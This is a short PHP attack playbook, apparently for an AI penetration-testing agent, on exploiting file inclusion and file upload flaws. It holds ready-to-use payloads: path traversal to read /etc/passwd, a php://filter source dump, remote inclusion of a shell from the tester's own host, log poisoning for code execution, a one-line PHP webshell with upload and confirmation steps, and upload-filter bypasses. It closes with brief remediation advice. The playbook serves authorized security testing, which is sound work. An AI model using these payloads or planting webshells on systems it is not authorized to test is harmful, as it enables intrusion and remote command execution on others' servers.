# File inclusion & upload (PHP)

## LFI / RFI
PHP `include($_GET['page'])` patterns. Test any `?page=`, `?file=`,
`?template=`, `?lang=`, `?view=` parameter.
- **LFI**: `?page=/etc/passwd`, `?page=../../../../etc/passwd`. Sweep traversal
  depths and targets in ONE `http_fuzz`: `url:".../?page=FUZZ"`,
  `match_regex:"root:.*:0:0:"`, `payloads:["/etc/passwd","../etc/passwd",
  "../../etc/passwd","../../../etc/passwd","../../../../etc/passwd"]` — a matched
  row pins the right depth. Read the PHP source via the filter wrapper:
  `?page=php://filter/convert.base64-encode/resource=index.php`, then base64-decode
  the body inside `browser_evaluate_js` (`atob`).
- **RFI** (if `allow_url_include=On`): `?page=http://<your-host>/shell.txt`.
- **Log poisoning → RCE**: inject PHP into a header (e.g. `User-Agent` via
  `http_request`), then LFI the access/error log.

## File upload
If an `input[type=file]` exists:
1. Stage a webshell with `browser_upload_file` (filename `shell.php`, content
   `<?php system($_GET['c']); ?>`), then click the form's submit button.
2. Read the success message for the stored path, then `http_request`
   that path with `?c=id` to confirm RCE.
3. Test filter bypasses: double extension `shell.php.jpg`, `.phtml` / `.php5`,
   MIME spoof via the `Content-Type` header, trailing dot/space.

Evidence: file contents read (LFI) or command output (RCE).
Remediation: whitelist includable files; `allow_url_include=Off`; validate
upload extension AND content; store uploads outside the webroot and serve them
non-executable.
